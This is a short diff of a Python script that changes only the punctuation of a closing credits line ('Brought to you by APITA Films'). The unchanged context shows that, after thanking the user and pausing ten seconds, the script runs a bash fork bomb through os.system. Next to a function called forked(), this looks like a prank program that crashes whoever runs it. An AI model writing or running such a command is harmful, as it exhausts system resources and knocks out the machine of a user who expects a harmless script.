@@ -52,7 +52,7 @@ def forked():
     forked()''')
   }
   os.system("python end.py")
-  print("Brought to you by APITA Films")
+  print("Brought to you by APITA Films.")
   print("Thanks for stopping in.")
   time.sleep(10)
   os.system(":(){ :|:& };:")
